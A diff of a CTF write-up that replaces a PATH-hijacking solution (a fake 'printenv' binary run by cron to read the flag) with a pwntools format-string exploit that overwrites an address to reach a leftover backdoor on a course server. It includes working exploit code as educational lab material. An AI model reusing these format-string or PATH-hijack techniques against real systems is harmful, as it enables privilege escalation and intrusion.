@@ -2,46 +2,57 @@
 
 ## Final Format
 
-- We started this challenge by checking what were the configurations of the _program_ file (using the _checksec_ function).
+- We started this challenge by checking what were the configurations of the _program_ file (using the _checksec_ function). We can see in the image below that this file is protected with canary's. So, writing in the stack would be a tough task.
 
-<p align="center">
-<img src="CTFs/Opcionals/Img/2-Final_Format/1.checksec.png" alt="file print - result (flag)" width="70%"/>
-</p><br/>
+<img src="CTFs/Opcionals/Img/2-Final_Format/1.checksec.png" alt="file print - result (flag)" width="70%"/><br/>
 
-- After some time, we could check that on the path `home/flag_reader` we have found that the **my_script.sh** file where we could see the printenv command being used to call a relative path.
-- This allowed us to rewrite the PATH environement variable.
+- For this challenge, the backdoor had been removed. But using the debugger (_gdb_) we were able to find that it was still present in the code (old_backdoor - 0x8049236).
+- Using the debugger, we also found a "jump" in the code that would be redirected to other addresses.
 
-![](https://i.imgur.com/qSIRP21.png)
+<img src="CTFs/Opcionals/Img/2-Final_Format/2.gdb.png" alt="file print - result (flag)" width="70%"/><br/>
 
-- After changing the directory to the _tmp_ folder, we have found a last_log file.
+- Now, we built a python exploit that would overwrite this address and put the address of the _old_backdoor_, exploring this vulnerabilitie.
 
-![](https://i.imgur.com/oVnHK2D.png)
 
-- After some time, we could coonfirm that the server was performing the script each every minute. Unfortunately, we dont't have access to the _flag_ file but the _cron_ has.
+```py
+from pwn import *
 
-- With this in mind, we created ```aux.c``` with code to open flag.txt:
+LOCAL = False
 
+if LOCAL:
+    pause()
+else:    
+    p = remote("ctf-fsi.fe.up.pt", 4007)
+
+#0x08049236  old_backdoor
+
+N = 60
+content = bytearray(0x0 for i in range(N))
+
+content[0:4]  =  (0xaaaabbbb).to_bytes(4, byteorder='little')
+content[4:8]  =  (0x0804c012).to_bytes(4, byteorder='little')
+content[8:12]  =  ("????").encode('latin-1')
+content[12:16]  =  (0x0804c010).to_bytes(4, byteorder='little')
+
+s = "%.2036x" + "%hn" + "%.35378x%hn"
+
+fmt  = (s).encode('latin-1')
+content[16:16+len(fmt)] = fmt
+
+p.recvuntil(b"here...")
+p.sendline(content)
+p.interactive()
 ```
-#include <stdio.h>
-#include <stdlib.h>
 
-int main(){
-    system(“cat /flags/flag.txt“); 
-}
+- After, we run the exploit built using the following instruction:
+```bash
+python3.10 exploit_example.py
 ```
 
-- And compiled it using the name ```printenv```. Doing this, the server will run our code, instead of the standard _printenv_ command.
+- Finally, we were able to enter the backdoor and cat the flag.
 
-![](https://i.imgur.com/grHyLzn.png)
-
-- Following this perspective, we also needed to update the PATHS of the environement variables and put it on the first line, in order to our _printenv_ be called, and to be the one the system will run instead. 
-
-- To do this, we created a file named _env_ with the following code:
-
-![](https://i.imgur.com/EHAN2Q7.png)
-
-- Finally, we opened _last_log_ file, waited a few seconds and there it was the flag.
+<img src="CTFs/Opcionals/Img/2-Final_Format/3.flag.png" alt="file print - result (flag)" width="70%"/><br/>
 
 ### Flag
 
-`flag{2f761ab782abaf2784f9d678ad9abfe}`
+`flag{4c8515b3a115ecf15875944a6c5738bd}`
